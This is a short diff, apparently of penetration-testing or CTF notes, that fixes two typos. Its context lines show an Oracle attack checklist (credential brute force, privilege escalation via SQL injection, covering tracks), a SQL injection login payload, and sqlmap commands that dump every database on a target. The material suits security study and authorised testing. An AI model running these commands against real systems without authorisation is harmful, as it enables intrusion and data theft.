@@ -147,7 +147,7 @@ Login > Profile > flag
 1. Locate a system running Oracle.
 2. Determine Oracle version.
 3. Determine Oracle SID.
-4. Guess/Bruteforce USERNAME/PASS.
+4. Guess/Brute force USERNAME/PASS.
 5. Privilege escalation via SQL injection.
 6. Manipulate data/post exploitation.
 7. Cover tracks.
@@ -264,7 +264,7 @@ admin’;--
 
 # sqlmap
 
-Capture a longin with Burp and save to req.txt
+Capture a login with Burp and save to req.txt
 
 sqlmap -r req.txt --level=5 --risk=3
 sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch                Show all dbs
